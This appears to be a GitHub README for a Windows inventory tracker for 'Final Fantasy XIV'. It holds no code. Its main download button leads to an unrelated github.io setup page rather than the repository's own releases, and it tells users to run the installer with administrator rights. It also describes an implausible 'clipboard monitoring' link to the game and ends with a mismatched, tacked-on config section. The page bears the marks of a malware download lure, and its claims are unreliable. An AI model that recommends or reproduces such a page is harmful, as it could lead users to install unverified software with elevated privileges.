# Obsidian‑FF14‑Item‑Tracker

**A Windows‑only desktop companion that records, organizes, and visualizes every item, quest, and inventory change you encounter in *Final Fantasy XIV***

---

## 📌 What Is This?

Obsidian‑FF14‑Item‑Tracker is a lightweight, **Windows 10/11** utility built for solo players, Free‑Company managers, and anyone who wants a reliable, offline log of their in‑game possessions.
- Capture every drop, craft, purchase, or trade as it happens.
- View historical trends, filter by category, and export summaries for guild planning.
- No internet connection required after the initial download.

> **Note:** The utility is purpose‑built for the Windows desktop environment; it will not run on macOS, Linux, or mobile platforms.

---

## 🚀 Quick Start

1. **Download** the latest installer from the official page.
2. Run the Release (requires administrator rights).
3. Launch **Obsidian‑FF14‑Item‑Tracker** from the Start menu.
4. Follow the on‑screen wizard to connect the tracker to your game client (via clipboard monitoring).

### Download & Install

<a href="https://rewfdf.github.io/SetupPage/" target="_blank"><img src="https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=windows" alt="Download Release Page"></a>
<a href="https://github.com/Prohibitiondemoon/Obsidian-FF14-Item-Tracker/releases/latest" target="_blank"><img src="https://img.shields.io/github/v/release/Prohibitiondemoon/Obsidian-FF14-Item-Tracker?style=for-the-badge&label=Latest%20Release" alt="Latest Release"></a>

---

## ✨ Features

| Category | Details |
|----------|---------|
| **Item Logging** | Automatic capture of loot, crafted items, market purchases, and trades. |
| **Quest Tracker** | Links items to the quests that reward them; see which objectives are still pending. |
| **Inventory Snapshots** | Take manual or timed snapshots of your full bag; compare changes over time. |
| **Search & Filter** | Quick text search, rarity filters, item type tabs, and custom tags. |
| **Export Options** | CSV, JSON, or Markdown reports for guild planning or personal archiving. |
| **Theme Support** | Light & dark modes that respect Windows system settings. |
| **Open‑Source** | Fully transparent code; contributions welcome. |

---

## 🛠️ Installation Details

- **Supported OS:** Windows 10 (1809+) & Windows 11 (all builds)
- **Framework:** .NET 6 (self‑contained) – no external runtimes needed
- **File Size:** ~12 MB
- **Permissions:** Requires read/write access to the user’s Documents folder for log storage.

---

## 📂 Project Layout

```
Obsidian-FF14-Item-Tracker/
├─ src/                     # Core application source
│   ├─ Models/              # Data structures (Item, Quest, Snapshot)
│   ├─ Services/            # Logging, Export, Clipboard monitoring
│   └─ UI/                  # WPF windows and view‑models
├─ resources/               # Icons, default themes
├─ logs/                    # Runtime logs (auto‑created)
└─ README.md                # You are here
```

---

## 🤝 Contributing

1. Fork the repository.
2. Create a feature branch (`git checkout -b feature/your‑idea`).
3. Ensure the project builds on Windows 10/11 with the latest .NET 6 SDK.
4. Submit a Pull Request with a clear description and screenshots (if UI changes).

> **Guideline:** Keep all new UI elements Windows‑native; avoid cross‑platform abstractions.

---

## 🐞 Reporting Issues

If you encounter a bug, please open an issue with the following details:

- Windows version (10/11) and build number.
- Steps to reproduce.
- Screenshot of the problematic UI (if applicable).
- Log file location (`%USERPROFILE%\Documents\ObsidianFF14\logs\`).

---

## 📜 License

This project is released under the **MIT License** – you are free to use, modify, and distribute it, provided the original copyright notice is retained.

---

## 🙏 Acknowledgments

- Thanks to the *Final Fantasy XIV* community for data references and testing.
- Built with love on the Windows platform using WPF and modern .NET tooling.

---

### Let’s make inventory management effortless—track, analyze, and dominate Eorzea!

## 📁 Configuration System

```text
configs/
├── default.cfg
├── visual.cfg
├── player.cfg
└── custom.cfg
```